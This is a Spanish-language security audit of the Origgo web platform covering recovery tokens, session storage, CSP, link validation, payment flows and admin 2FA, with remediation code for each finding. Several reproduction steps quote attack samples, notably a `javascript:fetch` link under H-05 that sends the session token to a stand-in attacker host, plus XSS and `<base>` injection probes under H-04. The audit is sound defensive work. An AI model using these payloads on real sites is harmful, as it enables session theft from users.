# Auditoría de seguridad y QA — Origgo (frontend, flujos y exposición en producción)

> **Fecha:** 2026-09-26 · **Alcance:** web pública (`src/`), panel de administración (`src/admin/`, `api/admin.js`, `lib/admin/`), flujos de autenticación, formularios y pagos, cabeceras de `vercel.json` y paquete de producción (`dist/`).
> **Método:** revisión de código, análisis del paquete compilado, pruebas con el sitio compilado servido con la CSP real (Playwright + Chrome) y pruebas de integración de regresión (`tests/seguridad_auditoria.test.js`, `tests/admin_2fa.test.js`, `scripts/test_ledger_wompi.js`).
> **Resultado:** 11 hallazgos (3 altos, 5 medios, 3 bajos). Corregidos: 10. Pendiente con plan: 1 (H-02). Suite completa (`npm test`): 8/8 fases, 0 errores.

## Resumen

| ID | Hallazgo | Gravedad | Estado |
| --- | --- | --- | --- |
| H-01 | Enlace de recuperación reutilizable y de 30 días (toma de cuenta) | **Alta** | ✅ Corregido |
| H-02 | Token de sesión del comprador (30 días) en `localStorage`, sin revocación | **Alta** | ⚠️ Mitigado, migración pendiente |
| H-03 | Cerrar sesión no borraba datos personales (equipos compartidos) | Media | ✅ Corregido |
| H-04 | CSP con scripts en línea permitidos y sin directivas clave | Media | ✅ Corregido |
| H-05 | Enlaces externos (datos raspados) sin validar el protocolo | Media | ✅ Corregido |
| H-06 | Flujos de pago simulados en el cliente (saldo inventado, "sincronizar" falso) | **Alta** | ✅ Corregido |
| H-07 | Teléfono inventado mostrado tras cobrar un desbloqueo | Media | ✅ Corregido |
| H-08 | Panel: sesión robada permitía acciones destructivas sin reverificar; sin aviso de ingreso | Media | ✅ Corregido |
| H-09 | Pruebas automáticas con credenciales reales (escribieron en la caché de producción) | Media | ✅ Corregido |
| H-10 | Llave web de Firebase sin restricción de dominio | Baja | 🔧 Acción del propietario |
| H-11 | Créditos cacheados en `localStorage` editables | Baja | ✅ Verificado (solo visual) |

**Controles verificados sin hallazgos:** no hay mapas de código fuente (`.map`) ni `console.log` en `dist/`; no hay secretos (Wompi, llaves privadas, tokens) en el paquete; `X-Frame-Options: DENY`, HSTS con preload, `nosniff` y `Referrer-Policy` correctos; el botón de pago se bloquea mientras procesa y envía `Idempotency-Key`; el desbloqueo y la acreditación de pagos son idempotentes en el servidor (`pago_<referencia>`); los textos de anuncios se pintan como texto (React), sin `innerHTML`; los tokens de bienvenida y de pago se retiran de la URL tras usarse.

---

## H-01 · Enlace de recuperación reutilizable y de 30 días

**Hallazgo:** los correos de confirmación de pago incluían un enlace `?recovery_token=<JWT>` válido por **30 días** y **reutilizable** (el servidor no quemaba el token). Además, la web no procesaba ese parámetro (enlace roto para el usuario legítimo), pero la API sí lo canjeaba.

**Gravedad:** Alta

**Vector de ataque y reproducción:**
1. El comprador reenvía su correo de pago, lo abre en un equipo compartido o el token queda en el historial del navegador o en registros de un proxy.
2. El atacante copia el token y ejecuta: `POST /api/auth/session {"action":"recover_token","recoveryToken":"<token>"}`.
3. Recibe una sesión de 30 días de la víctima; puede repetirlo todas las veces que quiera durante 30 días.

**Impacto en el negocio:** robo de cuentas con saldo o plan pagado, consumo de créditos ajenos, reclamos y pérdida de confianza.

**Código de remediación exacto (aplicado):**
```js
// lib/email-templates.js — 24 h y un solo uso (nonce), no 30 días reutilizable
const magicToken = signJwt(
  { purpose: 'recover_session', phone, email, role: 'buyer', nonce: require('crypto').randomUUID() },
  jwtSecret,
  1
);

// lib/auth/session.js — el nonce se quema de forma atómica (Firestore create)
const primerUso = payload && payload.nonce ? await db.marcarTokenUsado(`recuperacion_${payload.nonce}`) : false;
if (!payload || payload.purpose !== 'recover_session' || !payload.phone || !primerUso) {
  return res.status(401).json({ ok: false, error: 'TOKEN_RECUPERACION_INVALIDO' });
}
```
```ts
// src/App.tsx — la web por fin procesa el enlace y lo borra de la URL ANTES de usarlo
const recoveryToken = urlParams.get('recovery_token');
if (recoveryToken) {
  const urlLimpia = new URL(window.location.href);
  urlLimpia.searchParams.delete('recovery_token');
  window.history.replaceState({}, '', urlLimpia.toString());
  recuperarSesionConEnlace(recoveryToken).then(/* sesión real o error real */);
}
```
**Prueba de integración:** `tests/seguridad_auditoria.test.js` (primer canje 200, segundo 401; token sin nonce 401) y `scripts/test_ledger_wompi.js` (Test 6b).

---

## H-02 · Token de sesión del comprador en `localStorage` (30 días, sin revocación)

**Hallazgo:** el JWT del comprador (`origgo_auth_jwt_token`) vive 30 días en `localStorage` y cerrar sesión solo lo borra del navegador; el servidor lo sigue aceptando.

**Gravedad:** Alta

**Vector de ataque y reproducción:**
1. Cualquier XSS futuro (o una extensión maliciosa del navegador) ejecuta `localStorage.getItem('origgo_auth_jwt_token')` y lo envía a un servidor del atacante.
2. El atacante usa `Authorization: Bearer <token>` contra `/api/leads/unlock` durante 30 días, aunque la víctima "cierre sesión".

**Impacto en el negocio:** consumo de créditos ajenos y acceso a contactos desbloqueados por la víctima.

**Mitigación aplicada hoy:** CSP sin scripts en línea (H-04) — reduce drásticamente la probabilidad de XSS — y borrado completo al cerrar sesión (H-03).

**Código de remediación exacto (pendiente, recomendado como siguiente paso):**
```js
// Servidor: entregar la sesión en cookie HttpOnly (el JavaScript no puede leerla).
res.setHeader('Set-Cookie',
  `origgo_sesion=${token}; Path=/api; HttpOnly; Secure; SameSite=Lax; Max-Age=${7 * 86400}`);

// Revocación: versión de sesión en el usuario; cerrar sesión la incrementa.
// Al verificar: if (payload.sv !== user.sesionVersion) return 401;
await usersRef.doc(phone).update({ sesionVersion: FieldValue.increment(1) });
```
```ts
// Cliente: dejar de guardar el token; las peticiones usan credentials: 'include'.
fetch('/api/leads/unlock', { method: 'POST', credentials: 'include', body })
```
**Prueba de integración propuesta:** tras `POST /api/auth/session {action:'logout'}`, el mismo token debe responder 401 en `/api/leads/unlock`.

---

## H-03 · Cerrar sesión no borraba los datos personales

**Hallazgo:** `cerrarSesionLocal()` solo borraba el token y el celular. Quedaban en `localStorage` el **mapa de contactos desbloqueados (teléfonos de propietarios)**, créditos, correo y celular de compra.

**Gravedad:** Media

**Vector de ataque y reproducción:**
1. Un comprador usa Origgo en un café internet, desbloquea contactos y cierra sesión.
2. El siguiente usuario abre DevTools → Application → Local Storage → `origgo_unlocked_leads_map` y ve los teléfonos desbloqueados y el correo del anterior.

**Impacto en el negocio:** fuga de datos personales (Ley 1581) y de contactos pagados.

**Código de remediación exacto (aplicado):**
```ts
// src/services/auth.ts
export function cerrarSesionLocal(): void {
  const CLAVES_PERSONALES = [
    'origgo_auth_jwt_token', 'origgo_session_phone', 'origgo_auth_phone', 'origgo_auth_email',
    'origgo_user_credits_v1', 'origgo_unlocked_leads_map', 'origgo_pending_lead_id',
  ];
  try { CLAVES_PERSONALES.forEach((clave) => localStorage.removeItem(clave)); } catch {}
}
// src/App.tsx — además se vacía el estado en memoria para que no se vuelva a guardar
cerrarSesionLocal(); setUserSession(null); setUserCredits(0); setUnlockedMap({});
```
**Prueba de integración:** `tests/seguridad_auditoria.test.js` (H-03).

---

## H-04 · Política de seguridad de contenido (CSP) débil

**Hallazgo:** `script-src` incluía `'unsafe-inline'` (neutraliza la protección contra XSS) y dominios de Google Translate que no se usan; faltaban `object-src`, `base-uri`, `form-action` y `frame-ancestors`.

**Gravedad:** Media

**Vector de ataque y reproducción:**
1. Si un dato no confiable llega a inyectarse como HTML en cualquier punto, un `<script>alert(document.cookie)</script>` o `<img onerror=…>` se ejecuta porque la CSP permite código en línea.
2. Con `base-uri` abierto, un `<base href="https://atacante">` inyectado redirige todos los scripts relativos.

**Impacto en el negocio:** robo de sesiones (H-02), desfiguración del sitio, fraude en el flujo de pago.

**Código de remediación exacto (aplicado):**
```html
<!-- index.html: el único script en línea (tema e idioma) pasó a public/inicio.js -->
<script src="/inicio.js"></script>
```
```text
vercel.json → Content-Security-Policy:
script-src 'self' https://checkout.wompi.co https://*.wompi.co https://ka-f.fontawesome.com https://apis.google.com https://www.gstatic.com;
object-src 'none'; base-uri 'self'; form-action 'self' https://checkout.wompi.co; frame-ancestors 'none'; upgrade-insecure-requests
```
**Verificación:** el sitio compilado se sirvió con esta CSP exacta: 0 bloqueos, la portada y el panel se pintan, el tema se aplica y el widget de Wompi carga. **Prueba:** `tests/seguridad_auditoria.test.js` (H-04) impide que vuelva `'unsafe-inline'` o un script en línea.

---

## H-05 · Enlaces externos sin validar el protocolo

**Hallazgo:** el enlace del anuncio original (`unlockedData.link`) proviene de datos raspados de portales (fuente no confiable) y se usaba directo en `href`.

**Gravedad:** Media (React 19 bloquea `javascript:` en `href`, pero es defensa de una sola capa)

**Vector de ataque y reproducción:**
1. Un anuncio malicioso en un portal publica como enlace `javascript:fetch('https://atacante/?t='+localStorage.origgo_auth_jwt_token)`.
2. El cazador lo captura; al desbloquear, el comprador toca "Ver anuncio original" y se ejecuta el código.

**Impacto en el negocio:** robo de sesiones y contactos desde la propia web.

**Código de remediación exacto (aplicado):**
```ts
// src/utils/url-segura.ts
export function urlSegura(url: string | null | undefined): string {
  if (!url) return '';
  try {
    const u = new URL(String(url).trim());
    return u.protocol === 'https:' || u.protocol === 'http:' ? u.href : '';
  } catch { return ''; }
}
// src/components/BentoCard.tsx
href={urlSegura(unlockedData?.link) || '#'}
```
**Prueba de integración:** `tests/seguridad_auditoria.test.js` (H-05: `javascript:` y `data:` → vacío).

---

## H-06 · Flujos de pago simulados en el cliente

**Hallazgo:** tras aprobar el pago en el widget de Wompi, la web sumaba créditos **inventados** en el navegador (+10, "999", "9999"); la opción "Sincronizar pago" era un `setTimeout` que decía "saldo acreditado" sin consultar nada.

**Gravedad:** Alta (lógica de negocio)

**Vector de ataque y reproducción:**
1. Un usuario abre el widget, lo cierra con un pago rechazado o manipula la respuesta del callback a `APPROVED` desde DevTools.
2. La interfaz muestra saldo y "pago verificado" que no existen; soporte recibe reclamos por saldos falsos.

**Impacto en el negocio:** reclamos, pérdida de confianza y decisiones de soporte basadas en datos falsos.

**Código de remediación exacto (aplicado, commit `d302893`):**
```ts
// src/components/CheckoutModal.tsx — el saldo lo confirma el servidor, que verifica con Wompi
for (let intento = 0; intento < 4 && !confirmado; intento++) {
  if (intento > 0) await new Promise((r) => setTimeout(r, 2500));
  const res = await reclamarReferenciaPago(resultado.reference);
  if (res.ok && res.user) confirmado = res;
}
// src/components/SupportModal.tsx — "Sincronizar pago" consulta el pago real por su referencia
const res = await reclamarReferenciaPago(referencia);
```
**Prueba de integración:** `scripts/test_ledger_wompi.js` y `tests/pagos_idempotentes.test.js` (el reclamo acredita una sola vez).

---

## H-07 · Teléfono inventado tras cobrar un desbloqueo

**Hallazgo:** si el contacto desbloqueado no traía teléfono, la web mostraba `3001234567` (podría ser de una persona real) después de cobrar el crédito.

**Gravedad:** Media

**Vector de ataque y reproducción:** desbloquear un anuncio cuyo contacto no tenga teléfono → la ficha muestra el número ficticio con botones de WhatsApp y Llamar.

**Impacto en el negocio:** llamadas a un tercero ajeno, cobro por un dato falso, reclamos.

**Código de remediación exacto (aplicado):**
```ts
// src/App.tsx
phone: res.contacto!.telefonoDisplay || res.contacto!.telefono || '',
// src/components/BentoCard.tsx — sin teléfono real: solo "Ver anuncio original"
{isUnlocked && !phoneClean ? (<a href={urlSegura(unlockedData?.link) || '#'}>Ver Anuncio Original</a>) : …}
```

---

## H-08 · Panel de administración: acciones destructivas con sesión robada y sin aviso de ingreso

**Hallazgo:** con una sesión abierta (por ejemplo, un equipo prestado que se dejó abierto) se podía borrar inmuebles, cambiar precios, ajustar saldos y resolver retiros sin volver a probar la identidad; y no llegaba ningún aviso cuando alguien entraba al panel.

**Gravedad:** Media (el acceso ya exigía Google + lista de correos + rol + segundo factor)

**Vector de ataque y reproducción:**
1. El administrador entra desde un computador prestado y se aleja sin cerrar sesión (antes de que venzan los 15 minutos).
2. Otra persona abre la pestaña y cambia el precio de todos los planes a $1.000.

**Impacto en el negocio:** pérdida de ingresos, saldos regalados, retiros indebidos de anuncios.

**Código de remediación exacto (aplicado):**
```js
// lib/admin/sesion.js — el token guarda cuándo se verificó el último código (v2fa)
function verificacionReciente(datos, ahora = Date.now()) {
  const v = typeof datos.v2fa === 'number' ? datos.v2fa : datos.ini;
  return ahora - v <= 10 * 60 * 1000;
}
// lib/admin/acceso.js — acciones peligrosas exigen código de hace < 10 min ("modo sudo")
if (opciones.reciente && !verificacionReciente(estado.datos)) {
  throw Object.assign(new Error('Por seguridad, confirma tu código.'), { status: 403, codigo: 'REVERIFICAR' });
}
// lib/admin/leads.js (DELETE), operacion.js (PUT precios), clientes.js (POST), retiros.js (POST)
await exigirAdminCon2FA(req, res, { reciente: req.method === 'DELETE' });
// lib/admin/dos-factores.js — aviso por correo en CADA ingreso (método, hora, IP aproximada)
await codigoCorreo.avisarIngreso(admin, req, resultado);
```
En el panel, un 403 `REVERIFICAR` abre "Confirma que eres tú" (código de la app o por correo) y repite la acción sola.
**Prueba de integración:** `tests/admin_2fa.test.js` ("modo sudo": sesión activa con código de hace 11 min → 403; recién verificada → pasa; renovar por actividad no renueva `v2fa`).

---

## H-09 · Pruebas automáticas con credenciales reales

**Hallazgo:** `lib/env.js` cargaba el `.env` real también en pruebas; una prueba escribió un precio de prueba en la copia de respaldo de la caché de **producción** (Upstash). Ya se borró.

**Gravedad:** Media

**Vector y reproducción:** ejecutar `npm test` en un equipo con `.env` → las pruebas usan Upstash/Firebase de producción.

**Impacto en el negocio:** datos de prueba visibles para clientes (precios falsos) si falla la base de datos.

**Código de remediación exacto (aplicado, commit `5b15b86`):**
```js
// lib/env.js
const SERVICIOS_EXTERNOS = /^(UPSTASH_|FIREBASE_|WOMPI_|RESEND_|TELEGRAM_|R2_|CLOUDFLARE_|HEALTHCHECKS|INTERNAL_API_SECRET)/;
if (process.env.NODE_ENV === 'test' && SERVICIOS_EXTERNOS.test(key)) return;
```

---

## H-10 · Llave web de Firebase sin restricción de dominio

**Hallazgo:** la llave `AIza…` del panel está en el paquete (normal: Firebase la publica por diseño), pero si no está restringida en Google Cloud, cualquiera puede usarla desde otro sitio para abusar de la cuota de Identity Toolkit.

**Gravedad:** Baja

**Reproducción:** usar la llave desde `curl` contra `identitytoolkit.googleapis.com` desde otro origen.

**Impacto:** consumo de cuota gratuita de autenticación.

**Remediación (acción del propietario, gratis):** Google Cloud Console → APIs y servicios → Credenciales → la llave "Browser key" → **Restricciones de aplicación: sitios web** → `https://origgo.online/*`, `https://origgo.vercel.app/*`. Opcional: activar **Firebase App Check** (gratis).

---

## H-11 · Créditos cacheados en `localStorage`

**Hallazgo:** `origgo_user_credits_v1` se puede editar en DevTools.

**Gravedad:** Baja (verificado: solo cambia lo que se ve; el servidor descuenta y valida en `/api/leads/unlock`, que responde 402 sin saldo real, y la sesión se reemplaza por la del servidor al cargar).

**Remediación:** ninguna adicional; se borra al cerrar sesión (H-03).

---

## Cómo se protege hoy el panel de administración (resumen para quien lo reciba)

1. **Google** + correo en la lista autorizada (`ADMIN_EMAILS`) + rol `admin` (custom claim).
2. **Segundo factor:** app autenticadora (principal), códigos de respaldo o código por correo (10 min, un solo uso).
3. **Sesión:** cookie HttpOnly/Secure/SameSite=Strict; se cierra a los **15 min** sin actividad, a las **8 h** (2 h si se entró por correo) y al cerrar el navegador; aviso 2 min antes; pestañas sincronizadas.
4. **Modo sudo:** borrar, precios, saldos y retiros piden código reciente (10 min).
5. **Avisos:** correo en cada ingreso; todo queda en **Auditoría**.
6. **Límites:** 5 intentos de código cada 15 min; 3 envíos de código por correo cada 15 min.
